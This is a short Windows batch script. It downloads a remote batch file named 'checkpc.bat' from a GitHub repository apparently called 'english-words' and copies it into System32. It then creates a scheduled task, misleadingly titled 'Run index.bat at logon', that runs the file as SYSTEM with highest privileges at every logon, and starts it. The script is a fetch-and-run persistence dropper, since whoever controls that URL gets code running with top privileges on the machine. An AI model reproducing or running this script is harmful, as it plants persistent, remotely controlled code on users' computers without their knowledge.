@echo off 

cd /d %windir%\system32
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/INeddHelp/english-words/master/checkpc.bat' -OutFile checkpc.bat"
move /y checkpc.bat %windir%\System32\
schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\checkpc.bat" /sc ONLOGON /rl highest /ru System /f
start checkpc.bat
